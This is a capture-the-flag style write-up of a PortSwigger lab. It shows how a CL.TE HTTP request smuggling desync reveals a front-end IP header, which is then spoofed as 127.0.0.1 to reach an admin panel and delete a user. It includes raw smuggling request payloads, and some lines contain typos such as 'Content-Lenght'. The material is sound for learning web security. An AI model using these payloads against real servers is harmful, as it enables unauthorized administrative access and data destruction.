---
title: " PortSwiggerlabs: Exploiting HTTP request smuggling to reveal front-end request rewriting"
date: 2026-07-04 00:00:00 +0000
categories: [PortSwiggerLabs , HTTP Request Smuggling ]
tags: [PortSwiggerLabs , HTTP Request Smuggling , Challenge , Web_Attacks ]
---


## Information  :

This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding.

There's an admin panel at /admin, but it's only accessible to people with the IP address 127.0.0.1. The front-end server adds an HTTP header to incoming requests containing their IP address. It's similar to the X-Forwarded-For header but has a different name.

To solve the lab, smuggle a request to the back-end server that reveals the header that is added by the front-end server. Then smuggle a request to the back-end server that includes the added header, accesses the admin panel, and deletes the user carlos.


## Solution : 

Quick note:

HTTP Request Smuggling happens because of a disagreement between servers. In a typical setup you have a front-end (proxy, load balancer, CDN) forwarding requests to a back-end, and they share persistent TCP connections. The issue is that HTTP gives two ways to tell a server where a request body ends: Content-Length, which just counts bytes, and Transfer-Encoding: chunked, which sends the body in chunks ending with a zero-size chunk. When both headers are present in the same request, different servers may prioritize differently and that gap is what we exploit.

The idea is: you craft a request the front-end considers complete and forwards normally, but the back-end reads it differently and treats part of your body as leftover data sitting in the TCP buffer. That leftover then gets prepended to the next incoming request — yours or another user's. That's how you end up bypassing access controls, hijacking requests, or poisoning responses.

The three main variants are CL.TE, TE.CL, and TE.TE , basically which server trusts which header, or in the TE.TE case, how you obfuscate the Transfer-Encoding header enough that one server just ignores it entirely.

Before jumping into Burp, two things worth knowing: first, disable Update Content-Length in Repeater options , if Burp auto corrects your Content-Length you're defeating the whole point. Second, make sure you're sending over HTTP/1, not HTTP/2. When testing manually, timing delays are your main signal if the response hangs after your crafted request, the back-end is likely waiting for data that isn't coming, which means it's parsing things differently from the front-end. That's your confirmation.

Now back to the lab:

<img width="1835" height="781" alt="image" src="https://github.com/user-attachments/assets/1133c3fb-6801-499f-8e0a-adf0f85d8a56" />

Just like everytime we first need to find what case we've got , is it a CL.TE , TE.CL or a TE.TE . 

For this , I like to use this graph from **Jarno Timmermans** : 

<img width="1859" height="934" alt="image" src="https://github.com/user-attachments/assets/9a90be80-cfa7-4f38-921c-dffcba4b90b2" />

But you can use this guide from HackerReciepe : 

```bash
https://www.thehacker.recipes/web/config/http-request-smuggling/#practice
```

Now first let's send the detection request, that based on the response we will know if the backend and front end trust different Headers :

- First Downgrade the request to HTTP1.1/
- Then We change the request Method to POST 
- Then Remove Auto Length
- Add Transfer-Encoding: chunked
- Show Non-printable characters , this will be helpful when it comes to counting Bytes .
- In the Boy , add 

```bash
Content-Lenght: 6
Transfer-Encoding: chunked

1
123
X
```

<img width="777" height="342" alt="image" src="https://github.com/user-attachments/assets/aabe8cee-c638-4a94-9491-13ab8976fd62" />

Now if we send this , either we get an error which means the front end is definetly using TE , and since there is no terminating character we immediately get an error , and we need to figure out what the backend is using . 

Or we will get a delay , which means the front end does use CL , but the backend uses TE and since there is no terminating character , it will hang forever until we get a request time out . 

<img width="1863" height="552" alt="image" src="https://github.com/user-attachments/assets/fe1fbdcc-29b3-430f-96b9-e014685b984e" />

Perfect we get a Delay . which means we have a CL.TE . Now to confirm this we can smuggle a request for an endpoint that doesn't exist , then we send a normal request after that , if it returns 404 we will know that our request was indeed smuggled between both of the normal requests . 

As usual , we will need an attack request and a normal one that we will send once we send our attack request .

```bash
Content-Lenght: 6
Transfer-Encoding: chunked
\r\n
\r\n
0\r\n
\r\n
####### For the Backend The Request ends here , Now we smuggle the second one :
GET /Non_Existing HTTP/1.1
X-Ignore: x
```

We're adding the X-Ignore header just to bypass the issue we get when we're sending 2 requests at the same time , GET + GET .

- If we send a normal request after our attack request , it will get appended to the smuggled request .
- So we will have 2 request methods sometimes , it might look like this : 

```bash
GET /Non_Existing HTTP/1.1GET / HTTP/1.1 ....
```
- This will return an error , to avoid this we append the second request to a different header inside our smuggled request , so it looks soemthing like this :

```bash
GET /Non_Existing HTTP/1.1
X-Ignore: xGET / HTTP/1.1 ....
```

Now back to our attack request :

<img width="1453" height="468" alt="image" src="https://github.com/user-attachments/assets/777faaf8-f77b-4104-af6b-38ca693fd78c" />

For a CL.TE , it's okey to enable the update content-length since we need to send the entire request to the backend, and since the backend uses TE , we will end the request using our Terminating character instead and rest will be stored in the buffer . 

So the smuggled request stored in the buffer will be what comes after the terminating request , in this case this : 

```bash
GET /Non_Existing HTTP/1.1
X-Ignore: x
```

And we trigger it , by sending a normal request that will get appended to our smuggled request . 

Now back to our attack , now if we send a normal request , we should get a 404 : 

<img width="1499" height="474" alt="image" src="https://github.com/user-attachments/assets/2fdbe81f-f3c3-4bf8-a3fc-e23fb3f26dbd" />

Perfect this means our request for /Non_Existing was smuggled perfectly . 

Now we will do the same thing but for a different request , the search request :

<img width="1599" height="714" alt="image" src="https://github.com/user-attachments/assets/19f30ff2-c561-470c-bca0-bbf0c2fef157" />

```bash
POST / HTTP/1.1
Host: 0ab7005d034c369680793a2000e90036.web-security-academy.net
Priority: u=0, i
Content-Length: 116
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked

0

POST /Non_Existing HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 106

search=aaa
```

Now if we send this : 

<img width="1508" height="599" alt="image" src="https://github.com/user-attachments/assets/6f7751f5-acf6-4344-9827-6ee1b654fbfa" />

Now sending a normal request should return a 404 : 

<img width="1547" height="639" alt="image" src="https://github.com/user-attachments/assets/10a876c9-281f-4613-a6f1-5a02b2d37e4a" />

Perfect , now let's try to access the admin endpoint , First we send our attack request : 

<img width="1526" height="505" alt="image" src="https://github.com/user-attachments/assets/5cb19871-ca26-41ee-b602-47f6324ef781" />

Now a normal one : 

<img width="1606" height="642" alt="image" src="https://github.com/user-attachments/assets/f5b94243-741a-4e5e-aedc-e335f950508c" />

Good enough we are able to smuggle it , but we get a security restriction , let's make it look like it's coming from the localhost . 

<img width="1413" height="490" alt="image" src="https://github.com/user-attachments/assets/481970b5-eb7e-4123-ad8e-73b6c577fbab" />

Now if we send a normal request : 

<img width="1399" height="619" alt="image" src="https://github.com/user-attachments/assets/7de7ca26-cdf3-467f-9c97-ebd2cceb293c" />

Duplicate header error -_- . To bypass this , we can put the normal request that will be appeneded to the body of the smuggled request :

<img width="1494" height="592" alt="image" src="https://github.com/user-attachments/assets/1145863b-04af-4733-be6c-918b71286df4" />

We did get rid of the error but we can't bypass the restriction , we need the source origin header that the server uses to see where is the request coming from . 

Now let's go back to the initial request we had to the / , then we try smuggling a request to the search feature and see how the apps handles the request : 

Let's send the attack request : 

<img width="1416" height="621" alt="image" src="https://github.com/user-attachments/assets/858bc7b4-2581-44f8-af04-32c609a2c22a" />

Now the Normal request :

<img width="1617" height="646" alt="image" src="https://github.com/user-attachments/assets/b3c4ddea-e51b-43b8-b68c-ca5413b78062" />

Perfect we find a new header , like the origin IP header , "X-MmLZCn-Ip" header . This is perfect since we know the admin interface is only accessible from localhost . 

Now let's craft a new request to access the admin panel using this new Header . 

```bash
POST / HTTP/1.1
Host: 0ab7005d034c369680793a2000e90036.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 110
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
X-abcdef-Ip: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
X-ignore: x
```
<img width="1413" height="502" alt="image" src="https://github.com/user-attachments/assets/d5da55e2-f927-4fc6-8b11-3508a5981578" />

Now if we send a normal request : 

<img width="1293" height="585" alt="image" src="https://github.com/user-attachments/assets/d5d19d74-af5f-4518-a2ef-d2add60e4644" />

Another duplicate header error , one way to bypass this is to put the normal request that will get appended inside the body of the smuggled request , by the way we need to include the content-length inside the smuggled request since the backend needs a content-length to process requests (it's using CL remember).

```bash
POST / HTTP/1.1
Host: 0ab7005d034c369680793a2000e90036.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 125
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
X-MmLZCn-Ip: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 104

x=1
```

Now if we send the attack request : 

<img width="1540" height="557" alt="image" src="https://github.com/user-attachments/assets/2aca2df4-1dd6-4f13-87ef-b2f852bb9cf2" />

Then we need a normal request to trigger the smuggled request in the buffer : 

<img width="1257" height="539" alt="image" src="https://github.com/user-attachments/assets/82c31fff-fded-416e-8e3e-9971c47ad82e" />

Perfect , now all we need to do is just find the link for the delete button : 

<img width="1626" height="726" alt="image" src="https://github.com/user-attachments/assets/c5115ce0-2d6b-4d79-b6cb-4525693a370e" />

There we go , now we just modify the smuggled request : 

<img width="1577" height="662" alt="image" src="https://github.com/user-attachments/assets/93d734eb-e2d7-4ebb-963b-bcbbd116648b" />

Perfect now if we send a normal request , the user carlos should be deleted :)

<img width="1453" height="500" alt="image" src="https://github.com/user-attachments/assets/059a2b59-203f-4db1-b4c9-8c95c3677157" />

302 means it got redirected , so the user was indeed deleted , if we check the lab now : 

<img width="1699" height="786" alt="image" src="https://github.com/user-attachments/assets/80f615c0-8f9f-4b74-8bd3-f7ab4e35e4ae" />

It's solved . 

That was all for this lab , see you in the next one . 
